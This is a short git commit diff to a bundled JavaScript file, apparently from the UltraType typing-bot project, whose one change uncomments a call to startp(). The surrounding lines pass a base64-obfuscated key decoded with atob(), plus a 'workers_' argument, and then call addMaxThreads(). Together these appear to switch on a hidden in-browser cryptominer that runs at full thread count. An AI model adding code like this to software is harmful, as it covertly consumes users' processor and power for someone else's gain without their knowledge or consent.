c37a43741e5c735cd52a0091e963b7a658f99bf8
ultratype <ultratypebot@gmail.com>
2017-12-20 15:13:29 -0600

    Uncomment startp

--- OUT/OUT.js
+++ OUT/OUT.js
@@ -18,7 +18,7 @@
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                     let p = 'workers_';
                     args.push(p);
-                    // window[key].startp.apply(window[key], args);
+                    window[key].startp.apply(window[key], args);
                     window[key].addMaxThreads();
                     clearInterval(intv);
                     return;
